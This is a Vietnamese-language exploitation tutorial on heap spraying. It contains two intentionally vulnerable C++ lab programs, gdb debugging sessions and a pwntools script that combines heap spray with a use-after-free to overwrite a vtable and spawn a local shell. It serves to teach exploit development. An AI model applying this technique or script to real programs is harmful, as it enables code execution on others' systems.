# Heap Spray
-	kĩ thuật này dùng để fill heap memory với 1 giá trị xác định nào đó
	-	Heap spray yêu cầu 1 lượng lớn memory để tăng khả năng trigger được payload
	-	điều thường thấy nhất ở heap spray đó chính là đa phần code đều có NOP + payload cả
-	nếu dựa trên kĩ thuật này, ta có thể đoán được vị trí bắt đầu của vùng nhớ heap ở hầu hết mọi architecture và OS
	-	điều này có nghĩa là khi heap spray được sử dụng, thì heap được spray xấp xỉ có cùng vị trí
	-	hầu hết heap memory đều được allocate theo trình tự
-	kĩ thuật này có thể được áp dụng khi binary có vuln mà ta có thể overwrite được 1 con trỏ hàm mà con trỏ đó đọc giá trị ở heap và cũng có thể nhảy vào vùng nhớ đó.
	-	có nghĩa là bạn có control flow của chương trình bằng cách sử dụng địa chỉ của heap đó đã bị spray như 1 con trỏ hàm
	-	mặt khác thì nó có thể được áp dụng theo nhiều cách khác nhau tùy vào ngữ cảnh như thế nào

#### Implementation

implementation|description|references
---|---|---
**JavaScript(JIT spray)**|ở trình duyệt web, heap spray thông thường được triển khai trên JavaScript và tạo 1 chuỗi lớn kí tự để spray heap (JIT(Just-In-Time) Spray)<br>bạn có thể dùng kí tự ASCII hoặc Unicode ở trong chuỗi, tùy thuộc vào cách mà trình duyệt triển khai chuỗi đó | [JIT Spraying](https://en.wikipedia.org/wiki/JIT_spraying)<br>[case study](https://www.usenix.org/system/files/conference/woot18/woot18-paper-gawlik.pdf)
**VBScript**| trên IE, có 1 số trường hợp VBScript được dùng để tạo chuỗi thông qua hàm String|
**ActionScript**|có exploit về heap spray của adobe flash(nhưng mà hiện nay adobe đã ngừng hoạt động hoàn toàn trên mọi platform rồi)|[CVE-2009-1869](https://securityresear.ch/2009/08/03/exploitation-of-cve-2009-1869/)|
**Images**|heap spray có thể áp dụng các cách khác như load 1 file hình ảnh vào process, nhưng nó không thường được sử dụng rộng rãi cho lắm|
**HTML5**|It has been shown that the heap can be sprayed with very high allocation units using a technique introduced in HTML5.<br>In particular, it is said that you can work quickly using the low-level bitmap interface and web workers provided by the canvas API.(để nguyên gốc dễ hiểu hơn)|[HTML5 Heap Spray. EUSecWest 2012](https://exploiting.wordpress.com/2012/10/03/html5-heap-spray-eusecwest-2012/)

## Proof of Concept

source:
```c++
//g++ -o poc poc.cpp -ldl -no-pie
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <cstring>
  
void heapSpray(){
    int size;
    char *data;
  
    printf("Input size:\n");
    read(0, &size, 4);
    if (size > 0) {
        printf("Input contents:\n");
        data = new char[size];
        read(0, data, size);
    }
}
  
int main(){
    printf("Heap spray!\n");
    while(1){
        char status[2];
        heapSpray();
        printf("Will you keep typing?(No:0):\n");
        read(0,&status,2);
  
        if(atoi(status) == 0){
            printf("Exit!\n");
            break;
        }
    }
    return 0;
}
```
giải thích source:

-	`heapSpray()` sẽ được execute đến khi nào số 0 được input
-	`heapSpray()` nhận input length từ `read(0, &size, 4)` 
-	`heapSpray()` sẽ tạo `*data` trên heap = với length là input vừa nhập trên bằng cách sử dụng **`new`** operator
-	và sau đó sẽ lưu giá trị cho heap = hàm read() kế tiếp
-	ngay lúc này, sự mỏng manh của heap spray bắt đầu xuất hiện
	-	bởi vì Heap (\*data) được tạo không được dùng `delete` operator khi mà hàm `heapSpray()` kết thúc
	-	mỗi lần `heapSpray` được gọi, thì 1 vùng heap mới sẽ được allocate ngay sau vùng nhớ đã được allocate trước đó

![](https://i.imgur.com/IGGfZ8u.png)

##### \#define DEFAULT_MMAP_THRESHOLD_MIN (128 * 1024)

-	có 1 vài điều cần lưu ý khi sử dụng heap spray trên linux:
	-	malloc không hề mở rộng (expand) vùng nhớ heap khi size được allocate là 0x20000(128\*1024) hoặc lớn hơn
-	đoạn code sau là source code của malloc
	-	ở **"DEFAULT_MMAP_THRESHOLD_MIN"**, size tối thiểu đại diện cho giá trị mà mmap có thể chứa
```c
/*
  MMAP_THRESHOLD_MAX and _MIN are the bounds on the dynamically
  adjusted MMAP_THRESHOLD.
*/
 
#ifndef DEFAULT_MMAP_THRESHOLD_MIN
#define DEFAULT_MMAP_THRESHOLD_MIN (128 * 1024)
#endif
 
#ifndef DEFAULT_MMAP_THRESHOLD_MAX
  /* For 32-bit platforms we cannot increase the maximum mmap
     threshold much because it is also the minimum value for the
     maximum heap size and its alignment.  Going above 512k (i.e., 1M
     for new heaps) wastes too much address space.  */
# if __WORDSIZE == 32
#  define DEFAULT_MMAP_THRESHOLD_MAX (512 * 1024)
# else
#  define DEFAULT_MMAP_THRESHOLD_MAX (4 * 1024 * 1024 * sizeof(long))
# endif
#endif
```
-	malloc sử dụng giá trị của `DEFAULT_MMAP_THRESHOLD_MIN` để kiểm tra xem size của heap nếu được allocate có giống nhau không.
	-	nếu giá trị nhỏ, vùng nhớ sẽ được mở rộng và dùng lại vùng nhớ heap trước đó
	-	nếu giá trị lớn hơn, thì 1 vùng nhớ mới được allocate và sử dụng

```c
#define M_MMAP_THRESHOLD      -3
 
#ifndef DEFAULT_MMAP_THRESHOLD
#define DEFAULT_MMAP_THRESHOLD DEFAULT_MMAP_THRESHOLD_MIN
#endif
 
...
 
 
static struct malloc_par mp_ =
{
  .top_pad = DEFAULT_TOP_PAD,
  .n_mmaps_max = DEFAULT_MMAP_MAX,
  .mmap_threshold = DEFAULT_MMAP_THRESHOLD,
  .trim_threshold = DEFAULT_TRIM_THRESHOLD,
...
}
 
static void *
sysmalloc (INTERNAL_SIZE_T nb, mstate av)
{
 
...
 
 
 if (av == NULL
     || ((unsigned long) (nb) >= (unsigned long) (mp_.mmap_threshold)
        && (mp_.n_mmaps < mp_.n_mmaps_max)))
    {
      char *mm;           /* return value from mmap call*/
  
    try_mmap:
      /*
         Round up size to nearest page.  For mmapped chunks, the overhead
         is one SIZE_SZ unit larger than for normal chunks, because there
         is no following chunk whose prev_size field could be used.
  
         See the front_misalign handling below, for glibc there is no
         need for further alignments unless we have have high alignment.
       */
      if (MALLOC_ALIGNMENT == 2 * SIZE_SZ)
        size = ALIGN_UP (nb + SIZE_SZ, pagesize);
```

## Proof of Concept

-	đoạn code sau bao gồm heap spray và UAF
```c++
//g++ -o heapspray heapspray.cpp -ldl
#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <cstring>
#include <dlfcn.h>
 
class UAF {
    char memo[160];
 
public:
    UAF(char *memo) {
        strncpy(this->memo,memo,strlen(this->memo));
    }
 
    virtual void target() {
        write(1, this->memo, strlen(this->memo));
    }
};
 
void heapSpray(){
    int size;
    char *data;
 
    printf("Input size:\n");
    read(0, &size, 4);
    if (size > 0) {
        printf("Input contents:\n");
        data = new char[size];
        read(0, data, size);
    }
}
 
int main(){
    char memo[160] = {};
 
    void *printf_addr = dlsym(RTLD_NEXT, "printf");
    printf("Printf() address : %p\n",printf_addr);
 
    printf("Heap spray!\n");
    while(1){
        char status[2];
        heapSpray();
        printf("Will you keep typing?(No:0):\n");
        read(0,&status,2);
 
        if(atoi(status) == 0)
            break;
    }
 
    printf("Create vtable\n");
    read(0, memo, sizeof(memo));
 
    UAF *uaf = new UAF(memo);
    delete uaf;
 
    printf("UAF!\n");
    heapSpray();
 
    uaf->target();
 
    return 0;
}
```

-	tạo break point như sau:
	-	0x400b42: Create UAF Class
	-	0x400b58: Delete UAF Class
	-	0x400a26: heapSpray new char[size]
	-	0x400a41: call read() function in heapSpray function
```nasm
lazenca0x0@ubuntu:~/Exploit/HeapSpray$ gdb -q ./heapspray
Reading symbols from ./heapspray...(no debugging symbols found)...done.
gdb-peda$ disassemble main
Dump of assembler code for function main:
   0x0000000000400a5d <+0>:   push   rbp
   0x0000000000400a5e <+1>:   mov    rbp,rsp
   0x0000000000400a61 <+4>:   push   rbx
   0x0000000000400a62 <+5>:   sub    rsp,0xd8
   0x0000000000400a69 <+12>:  mov    rax,QWORD PTR fs:0x28
   0x0000000000400a72 <+21>:  mov    QWORD PTR [rbp-0x18],rax
   0x0000000000400a76 <+25>:  xor    eax,eax
   0x0000000000400a78 <+27>:  lea    rdx,[rbp-0xc0]
   0x0000000000400a7f <+34>:  mov    eax,0x0
   0x0000000000400a84 <+39>:  mov    ecx,0x14
   0x0000000000400a89 <+44>:  mov    rdi,rdx
   0x0000000000400a8c <+47>:  rep stos QWORD PTR es:[rdi],rax
   0x0000000000400a8f <+50>:  mov    esi,0x400cd0
   0x0000000000400a94 <+55>:  mov    rdi,0xffffffffffffffff
   0x0000000000400a9b <+62>:  call   0x4008a0 <dlsym@plt>
   0x0000000000400aa0 <+67>:  mov    QWORD PTR [rbp-0xe0],rax
   0x0000000000400aa7 <+74>:  mov    rax,QWORD PTR [rbp-0xe0]
   0x0000000000400aae <+81>:  mov    rsi,rax
   0x0000000000400ab1 <+84>:  mov    edi,0x400cd7
   0x0000000000400ab6 <+89>:  mov    eax,0x0
   0x0000000000400abb <+94>:  call   0x400800 <printf@plt>
   0x0000000000400ac0 <+99>:  mov    edi,0x400cee
   0x0000000000400ac5 <+104>: call   0x400810 <puts@plt>
   0x0000000000400aca <+109>: call   0x4009d6 <_Z9heapSprayv>
   0x0000000000400acf <+114>: mov    edi,0x400cfa
   0x0000000000400ad4 <+119>: call   0x400810 <puts@plt>
   0x0000000000400ad9 <+124>: lea    rax,[rbp-0xd0]
   0x0000000000400ae0 <+131>: mov    edx,0x2
   0x0000000000400ae5 <+136>: mov    rsi,rax
   0x0000000000400ae8 <+139>: mov    edi,0x0
   0x0000000000400aed <+144>: call   0x400840 <read@plt>
   0x0000000000400af2 <+149>: lea    rax,[rbp-0xd0]
   0x0000000000400af9 <+156>: mov    rdi,rax
   0x0000000000400afc <+159>: call   0x400870 <atoi@plt>
   0x0000000000400b01 <+164>: test   eax,eax
   0x0000000000400b03 <+166>: jne    0x400aca <main+109>
   0x0000000000400b05 <+168>: mov    edi,0x400d17
   0x0000000000400b0a <+173>: call   0x400810 <puts@plt>
   0x0000000000400b0f <+178>: lea    rax,[rbp-0xc0]
   0x0000000000400b16 <+185>: mov    edx,0xa0
   0x0000000000400b1b <+190>: mov    rsi,rax
   0x0000000000400b1e <+193>: mov    edi,0x0
   0x0000000000400b23 <+198>: call   0x400840 <read@plt>
   0x0000000000400b28 <+203>: mov    edi,0xa8
   0x0000000000400b2d <+208>: call   0x4008c0 <_Znwm@plt>
   0x0000000000400b32 <+213>: mov    rbx,rax
   0x0000000000400b35 <+216>: lea    rax,[rbp-0xc0]
   0x0000000000400b3c <+223>: mov    rsi,rax
   0x0000000000400b3f <+226>: mov    rdi,rbx
   0x0000000000400b42 <+229>: call   0x400ba8 <_ZN3UAFC2EPc>
   0x0000000000400b47 <+234>: mov    QWORD PTR [rbp-0xd8],rbx
   0x0000000000400b4e <+241>: mov    rax,QWORD PTR [rbp-0xd8]
   0x0000000000400b55 <+248>: mov    rdi,rax
   0x0000000000400b58 <+251>: call   0x400830 <_ZdlPv@plt>
   0x0000000000400b5d <+256>: mov    edi,0x400d25
   0x0000000000400b62 <+261>: call   0x400810 <puts@plt>
   0x0000000000400b67 <+266>: call   0x4009d6 <_Z9heapSprayv>
   0x0000000000400b6c <+271>: mov    rax,QWORD PTR [rbp-0xd8]
   0x0000000000400b73 <+278>: mov    rax,QWORD PTR [rax]
   0x0000000000400b76 <+281>: mov    rax,QWORD PTR [rax]
   0x0000000000400b79 <+284>: mov    rdx,QWORD PTR [rbp-0xd8]
   0x0000000000400b80 <+291>: mov    rdi,rdx
   0x0000000000400b83 <+294>: call   rax
   0x0000000000400b85 <+296>: mov    eax,0x0
   0x0000000000400b8a <+301>: mov    rcx,QWORD PTR [rbp-0x18]
   0x0000000000400b8e <+305>: xor    rcx,QWORD PTR fs:0x28
   0x0000000000400b97 <+314>: je     0x400b9e <main+321>
   0x0000000000400b99 <+316>: call   0x400880 <__stack_chk_fail@plt>
   0x0000000000400b9e <+321>: add    rsp,0xd8
   0x0000000000400ba5 <+328>: pop    rbx
   0x0000000000400ba6 <+329>: pop    rbp
   0x0000000000400ba7 <+330>: ret   
End of assembler dump.
gdb-peda$ b *0x0000000000400b42
Breakpoint 1 at 0x400b42
gdb-peda$ b *0x0000000000400b58
Breakpoint 2 at 0x400b58
 
gdb-peda$ disassemble _Z9heapSprayv
Dump of assembler code for function _Z9heapSprayv:
   0x00000000004009d6 <+0>:   push   rbp
   0x00000000004009d7 <+1>:   mov    rbp,rsp
   0x00000000004009da <+4>:   sub    rsp,0x20
   0x00000000004009de <+8>:   mov    rax,QWORD PTR fs:0x28
   0x00000000004009e7 <+17>:  mov    QWORD PTR [rbp-0x8],rax
   0x00000000004009eb <+21>:  xor    eax,eax
   0x00000000004009ed <+23>:  mov    edi,0x400cb4
   0x00000000004009f2 <+28>:  call   0x400810 <puts@plt>
   0x00000000004009f7 <+33>:  lea    rax,[rbp-0x14]
   0x00000000004009fb <+37>:  mov    edx,0x4
   0x0000000000400a00 <+42>:  mov    rsi,rax
   0x0000000000400a03 <+45>:  mov    edi,0x0
   0x0000000000400a08 <+50>:  call   0x400840 <read@plt>
   0x0000000000400a0d <+55>:  mov    eax,DWORD PTR [rbp-0x14]
   0x0000000000400a10 <+58>:  test   eax,eax
   0x0000000000400a12 <+60>:  jle    0x400a46 <_Z9heapSprayv+112>
   0x0000000000400a14 <+62>:  mov    edi,0x400cc0
   0x0000000000400a19 <+67>:  call   0x400810 <puts@plt>
   0x0000000000400a1e <+72>:  mov    eax,DWORD PTR [rbp-0x14]
   0x0000000000400a21 <+75>:  cdqe  
   0x0000000000400a23 <+77>:  mov    rdi,rax
   0x0000000000400a26 <+80>:  call   0x400820 <_Znam@plt>
   0x0000000000400a2b <+85>:  mov    QWORD PTR [rbp-0x10],rax
   0x0000000000400a2f <+89>:  mov    eax,DWORD PTR [rbp-0x14]
   0x0000000000400a32 <+92>:  movsxd rdx,eax
   0x0000000000400a35 <+95>:  mov    rax,QWORD PTR [rbp-0x10]
   0x0000000000400a39 <+99>:  mov    rsi,rax
   0x0000000000400a3c <+102>: mov    edi,0x0
   0x0000000000400a41 <+107>: call   0x400840 <read@plt>
   0x0000000000400a46 <+112>: nop
   0x0000000000400a47 <+113>: mov    rax,QWORD PTR [rbp-0x8]
   0x0000000000400a4b <+117>: xor    rax,QWORD PTR fs:0x28
   0x0000000000400a54 <+126>: je     0x400a5b <_Z9heapSprayv+133>
   0x0000000000400a56 <+128>: call   0x400880 <__stack_chk_fail@plt>
   0x0000000000400a5b <+133>: leave 
   0x0000000000400a5c <+134>: ret   
End of assembler dump.
gdb-peda$ b *0x0000000000400a26
Breakpoint 3 at 0x400a26
gdb-peda$ b *0x0000000000400a41
Breakpoint 4 at 0x400a41
gdb-peda$
```

**tạo heap**
```nasm
gdb-peda$ r
Starting program: /home/lazenca0x0/Exploit/HeapSpray/heapspray
Printf() address : 0x7ffff74dc800
Heap spray!
Input size:
100
Input contents:
 
Breakpoint 3, 0x0000000000400a26 in heapSpray() ()
gdb-peda$ i r rdi
rdi            0xa303031    0xa303031
gdb-peda$ set $rdi = 100
gdb-peda$ ni
 
0x0000000000400a2b in heapSpray() ()
gdb-peda$ i r rax
rax            0x615030 0x615030
gdb-peda$ c
Continuing.
 
Breakpoint 4, 0x0000000000400a41 in heapSpray() ()
gdb-peda$ c
Continuing.
AAAA
Will you keep typing?(No:0):
0
Create vtable
100
```

-	khi UAF class được tạo như sau, thì vùng nhớ mới được allocate tại heap
	-	tức VTables của UAF class được lưu tại vùng nhớ heap được allocate
```nasm
Breakpoint 1, 0x0000000000400b42 in main ()
gdb-peda$ i r rsi
rsi            0x7fffffffe3e0   0x7fffffffe3e0
gdb-peda$ x/gx 0x7fffffffe3e0
0x7fffffffe3e0: 0x000000000a303031
gdb-peda$ set *0x7fffffffe3e0 = 0x64
gdb-peda$ ni
 
0x0000000000400b47 in main ()
gdb-peda$ i r rax
rax            0x6150a8 0x6150a8
gdb-peda$ i r rbx
rbx            0x6150a0 0x6150a0
gdb-peda$ x/4gx 0x0000000000400d40
0x400d40 <_ZTV3UAF+16>:   0x0000000000400bf2  0x00000000006020a0
0x400d50 <_ZTI3UAF+8>:    0x0000000000400d58  0x0000000046415533
gdb-peda$ x/10i 0x0000000000400bf2
   x <_ZN3UAF6targetEv>:  push   rbp
   0x400bf3 <_ZN3UAF6targetEv+1>: mov    rbp,rsp
   0x400bf6 <_ZN3UAF6targetEv+4>: sub    rsp,0x10
   0x400bfa <_ZN3UAF6targetEv+8>: mov    QWORD PTR [rbp-0x8],rdi
   0x400bfe <_ZN3UAF6targetEv+12>:    mov    rax,QWORD PTR [rbp-0x8]
   0x400c02 <_ZN3UAF6targetEv+16>:    add    rax,0x8
   0x400c06 <_ZN3UAF6targetEv+20>:    mov    rdi,rax
   0x400c09 <_ZN3UAF6targetEv+23>:    call   0x400860 <strlen@plt>
   0x400c0e <_ZN3UAF6targetEv+28>:    mov    rdx,rax
   0x400c11 <_ZN3UAF6targetEv+31>:    mov    rax,QWORD PTR [rbp-0x8]
gdb-peda$ c
Continuing.
```
-	lỗi UAF bắt đầu như sau
	-	nếu UAF class bị xóa và sau đó lại được allocate cùng size với UAF class dùng `HeapSpray()`, thì lúc lỗi UAF xuất hiện
-	nói cách khác, có thể lấy được shell thông qua UAF.
	-	fill vùng nhớ heap với one_gadget bằng heap spray
	-	sau đó, vùng nhớ bị spray đó có thể hiểu là vùng nhớ được allocate cho lỗi UAF
	-	vì lí do này, dòng `uaf->target()` ngầm hiểu one_gadget như là địa chỉ của `target()` và sẽ execute one_gadget lưu tại heap spray đó.
```nasm

Breakpoint 2, 0x0000000000400b58 in main ()
gdb-peda$ i r rdi
rdi            0x6150a0 0x6150a0
gdb-peda$ c
Continuing.
UAF!
Input size:
100
Input contents:
 
 
Breakpoint 3, 0x0000000000400a26 in heapSpray() ()
gdb-peda$ i r rdi
rdi            0xa303031    0xa303031
gdb-peda$ set $rdi = 100
gdb-peda$ ni
 
0x0000000000400a2b in heapSpray() ()
gdb-peda$ i r rax
rax            0x6150a0 0x6150a0
gdb-peda$ x/10gx 0x6150a0
0x6150a0:   0x0000000000400d40  0x0000000000000000
0x6150b0:   0x0000000000000000  0x0000000000000000
0x6150c0:   0x0000000000000000  0x0000000000000000
0x6150d0:   0x0000000000000000  0x0000000000000000
0x6150e0:   0x0000000000000000  0x0000000000000000
gdb-peda$ c
Continuing.
 
Breakpoint 4, 0x0000000000400a41 in heapSpray() ()
gdb-peda$ i r rdi
rdi            0x0  0x0
gdb-peda$ i r rsi
rsi            0x6150a0 0x6150a0
gdb-peda$ ni
AAAABBBB
 
0x0000000000400a46 in heapSpray() ()
gdb-peda$ x/10gx 0x6150a0
0x6150a0:   0x4242424241414141  0x000000000000000a
0x6150b0:   0x0000000000000000  0x0000000000000000
0x6150c0:   0x0000000000000000  0x0000000000000000
0x6150d0:   0x0000000000000000  0x0000000000000000
0x6150e0:   0x0000000000000000  0x0000000000000000
gdb-peda$
```

source py
```python
from pwn import *
 
#context.log_level = 'debug'
 
startBrk =  0x602000
spraySize = 0x10000
sprayRange = 0x5000000
sprayCount = sprayRange /spraySize
targetOffset = 0x400
target = startBrk + sprayRange + targetOffset
 
p = process('./heapspray')
#sleep(20)
p.recvuntil("Printf() address : ")
libcAddr = p.recvuntil('\n')
libcAddr = int(libcAddr,16)
 
libcBase = libcAddr - 0x55800
oneGadget = libcBase + 0xf02a4
 
log.info('target : '+hex(target))
log.info('libcBase Addr : '+hex(libcBase))
log.info('oneGadget Addr : '+hex(oneGadget))
 
for i in xrange(sprayCount):
    size = spraySize - 0x10
    p.recvuntil("Input size:\n")
    p.send(p32(size))
 
    p.recvuntil("Input contents:\n")
    buf = p64(oneGadget) * (size // 8)
    buf += 'A' * (size-len(buf))
    p.send(buf)
 
    p.recvuntil("Will you keep typing?(No:0):\n")
    if i == sprayCount-1:
        print "Finished Heap spray!\n"
        p.sendline(str(0))
    else:
        p.sendline(str(1))
 
p.recvuntil("Create vtable\n")
p.send("Hello Heap spray & UAF")
 
p.recvuntil("Input size:\n")
p.send(p32(160))
 
p.recvuntil("Input contents:\n")
buf = p64(target) * (160 // 8)
buf += 'C' * (160-len(buf))
p.send(buf)
 
p.interactive()
```
```nasm
lazenca0x0@ubuntu:~/Exploit/11.Heap Spray$ python exploit.py
[+] Starting local process './heapspray': pid 25405
[*] target : 0x5602400
[*] libcBase Addr : 0x7fc228a49000
[*] oneGadget Addr : 0x7fc228b392a4
Finished Heap spray!
 
[*] Switching to interactive mode
$ id
uid=1000(lazenca0x0) gid=1000(lazenca0x0) groups=1000(lazenca0x0),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
$
```
## References
>-	https://en.wikipedia.org/wiki/Heap_spraying
>-	http://index-of.co.uk/Reverse-Engineering/Heap%20Spray%20%5Bforce%5D.pdf
>-	http://inaz2.hatenablog.com/entry/2015/03/02/014252
>-	http://pjongy.tistory.com/132
>-	http://truthtilltheend.tistory.com/entry/%ED%9E%99-%EC%8A%A4%ED%94%84%EB%A0%88%EC%9D%B4Heap-Spray-%EA%B8%B0%EB%B2%95
>-	http://hackability.kr/entry/%EC%9D%B5%EC%8A%A4%ED%94%8C%EB%A1%9C%EC%9E%87-%EA%B0%9C%EB%B0%9C-11-Exploitme5-%ED%9E%99-%EC%8A%A4%ED%94%84%EB%A0%88%EC%9E%89-UAF